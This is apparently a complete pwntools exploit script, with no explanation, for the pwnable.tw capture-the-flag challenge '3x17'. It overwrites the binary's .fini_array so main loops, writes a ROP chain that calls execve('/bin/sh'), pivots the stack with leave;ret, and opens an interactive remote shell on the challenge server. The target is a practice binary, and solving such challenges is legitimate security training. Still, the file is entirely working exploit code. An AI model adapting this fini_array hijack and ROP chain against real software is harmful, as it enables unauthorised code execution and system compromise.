from pwn import *

context.arch = "amd64"

binary = "./3x17"
elf = ELF(binary)
#p = process(binary)
p = remote("chall.pwnable.tw", 10105)

def send(addr, data):
    p.recvuntil(b"addr:"  )
    p.sendline(str(addr).encode())
    p.recvuntil(b"data:"  )
    p.send(data)

binary_base = 0x400000

fini_arr = 0x4b40f0
main = 0x401b6d
fini= 0x402960


# set up rop chain
elf.address = binary_base
rop = ROP(elf)

pop_rax = rop.find_gadget(["pop rax","ret"]).address
pop_rdi = rop.find_gadget(["pop rdi","ret"]).address
pop_rsi = rop.find_gadget(["pop rsi","ret"]).address
pop_rdx = rop.find_gadget(["pop rdx","ret"]).address
syscall = rop.find_gadget(["syscall","ret"]).address
leave = rop.find_gadget(["leave","ret"]).address

send(fini_arr, p64(fini)+p64(main))


# begin infinite loop via fini_overwrite
send(fini_arr + 2*8, p64(pop_rdi) + p64(fini_arr + 11*8))
send(fini_arr + 4*8, p64(pop_rsi) + p64(0) )
send(fini_arr + 6*8, p64(pop_rdx) + p64(0) )
send(fini_arr + 8*8, p64(pop_rax) + p64(59) )
send(fini_arr + 10*8, p64(syscall) + b'/bin/sh\x00' )
send(fini_arr, p64(leave) )

p.interactive()
